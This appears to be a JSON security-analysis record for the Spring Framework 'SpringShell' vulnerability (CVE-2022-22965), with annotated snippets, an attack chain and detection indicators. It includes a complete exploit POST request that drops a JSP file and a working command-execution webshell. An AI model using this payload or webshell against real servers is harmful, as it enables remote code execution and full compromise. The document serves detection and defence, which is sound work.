@@ -1,0 +1,125 @@
+{
+  "package_info": {
+    "package_name": "spring-web",
+    "package_manager": "Maven/Gradle (Java ecosystem)",
+    "package_versions": "<=5.2.19, <=5.3.17 (fixed in 5.2.20, 5.3.18)",
+    "why_malicious": "The affected versions of the Spring Framework (spring-web) contain a critical vulnerability (CVE-2022-22965, 'SpringShell') that allows attackers to manipulate the class loader via HTTP request data binding. This enables arbitrary file write and remote code execution (RCE) under certain conditions, such as running on Tomcat with a vulnerable JDK version. The vulnerability is easily exploitable in many real-world web applications, leading to full server compromise."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "HTTP request handling (runtime, on request to vulnerable endpoint)",
+        "file_location": "Spring Controller (e.g., @GetMapping/@RequestMapping handler)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "@GetMapping(\"/greeting\")\npublic String helloWorld(@ModelAttribute SomeClass someClass, Model model) {\n    return \"hello\";\n}",
+      "code_language": "java",
+      "code_behavior": "At runtime, when a vulnerable HTTP endpoint is accessed, the code binds HTTP request parameters to a Java object using Spring's data binding mechanism, allowing external control over internal object properties, including class loader attributes, which can be abused to manipulate server internals and enable arbitrary file write or code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Binding user-controlled data directly to complex Java objects via @ModelAttribute exposes internal fields, such as class loader properties, to external manipulation. This breaks encapsulation and allows attackers to set sensitive fields that should never be externally modifiable.",
+        "violated_expectations": "Normal data binding should only allow safe, explicitly exposed fields to be set by user input. Here, internal JVM/class loader properties are exposed, violating the principle of least privilege and safe deserialization.",
+        "similar_legitimate_use": "Legitimate use: binding form data to POJOs for business logic, but only for explicitly allowed fields. Exposing internal JVM or class loader state is never legitimate.",
+        "key_indicators": [
+          "Use of @ModelAttribute or implicit data binding to POJOs in controller methods",
+          "No explicit restriction (e.g., @InitBinder) on which fields can be set via HTTP parameters",
+          "Binding to custom or complex types (not just primitives or DTOs) in request handlers"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "Exploit payload delivery (runtime, via crafted HTTP request)",
+        "file_location": "HTTP request parameters (targeting class loader fields)",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "POST /endpoint HTTP/1.1\nHost: victim.com\nContent-Type: application/x-www-form-urlencoded\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+      "code_language": "HTTP (exploit payload)",
+      "code_behavior": "At runtime, the attacker sends a specially crafted HTTP POST request with parameters targeting internal class loader and Tomcat AccessLogValve properties, causing the server to write a malicious JSP webshell file into the Tomcat web root directory.",
+      "malice_analysis": {
+        "why_suspicious": "External control of class loader and Tomcat internal properties via HTTP parameters is highly abnormal and enables attackers to redirect log output to arbitrary files, resulting in webshell deployment.",
+        "violated_expectations": "Normal HTTP requests should not be able to modify server internals, such as file paths or logging patterns, or write files to the web root. This violates application and container security boundaries.",
+        "similar_legitimate_use": "None; setting internal Tomcat pipeline or class loader properties via HTTP parameters is never legitimate and is only used for exploitation.",
+        "key_indicators": [
+          "HTTP parameters with names matching class.module.classLoader.resources.context.parent.pipeline.first.*",
+          "Payloads that set log pattern, suffix, directory, prefix, or fileDateFormat to values resulting in .jsp file creation",
+          "Unusual POST requests with multiple parameters targeting internal Java/Tomcat fields"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "Webshell execution (runtime, after file write)",
+        "file_location": "Dropped JSP file in Tomcat web root (e.g., webapps/ROOT/shell.jsp)",
+        "required_permissions": [
+          "filesystem",
+          "process execution"
+        ]
+      },
+      "code_snippet": "<%\njava.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();\nint a = -1;\nbyte[] b = new byte[2048];\nwhile((a=in.read(b))!=-1) {\n    out.println(new String(b));\n}\n%>",
+      "code_language": "jsp",
+      "code_behavior": "At runtime, after the malicious JSP webshell is written to the web root, the attacker accesses the webshell and supplies a 'cmd' parameter via HTTP, causing the server to execute arbitrary shell commands and return the output in the HTTP response.",
+      "malice_analysis": {
+        "why_suspicious": "JSP code that executes arbitrary shell commands based on user input is a classic webshell pattern, enabling attackers to run any command on the server with the privileges of the web process.",
+        "violated_expectations": "Normal JSP files should never allow arbitrary command execution from HTTP parameters. This violates application security and enables full remote code execution.",
+        "similar_legitimate_use": "None; executing shell commands from user input in a web application is always malicious.",
+        "key_indicators": [
+          "Use of Runtime.getRuntime().exec with direct user input (e.g., request.getParameter)",
+          "Reading command output and returning it in the HTTP response",
+          "JSP files in web root with code that enables arbitrary command execution"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted HTTP request to a vulnerable Spring endpoint, exploiting data binding to set internal class loader and Tomcat AccessLogValve properties.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Arbitrary file write (webshell drop) in web root"
+    },
+    {
+      "step": 2,
+      "action": "Tomcat writes a JSP webshell file to the web root directory using the attacker-controlled log pattern and parameters.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Webshell available for remote access"
+    },
+    {
+      "step": 3,
+      "action": "Attacker accesses the webshell and sends commands via HTTP parameters, achieving remote code execution.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Full remote code execution on the server"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "HTTP requests with parameters targeting class loader or Tomcat pipeline fields (e.g., class.module.classLoader.resources.context.parent.pipeline.first.*)",
+      "Unexpected creation of .jsp files in Tomcat web root directory (e.g., webapps/ROOT/)",
+      "JSP files containing Runtime.getRuntime().exec or similar command execution patterns",
+      "Correlated sequence of suspicious HTTP requests followed by new .jsp file creation and subsequent access to that file"
+    ],
+    "file_indicators": [
+      "webapps/ROOT/*.jsp (unexpected new files in Tomcat web root)",
+      "JSP files containing code that executes shell commands (e.g., Runtime.getRuntime().exec with user input)"
+    ],
+    "network_indicators": [
+      "Unusual HTTP requests with parameters such as class.module.classLoader.resources.context.parent.pipeline.first.pattern, .suffix, .directory, .prefix, .fileDateFormat",
+      "Subsequent HTTP requests to newly created .jsp files in the web root, especially with 'cmd' or similar parameters"
+    ],
+    "how_to_detect": "Monitor HTTP requests for parameters attempting to set internal Java or Tomcat properties (e.g., class.module.classLoader.resources.context.parent.pipeline.first.*). Alert on creation or modification of .jsp files in the Tomcat web root directory, especially those containing code that executes shell commands from user input. Correlate suspicious HTTP requests with file creation events and subsequent access to those files. Flag any JSP file that uses Runtime.getRuntime().exec with user-supplied parameters as a high-confidence indicator of compromise."
+  }
+}
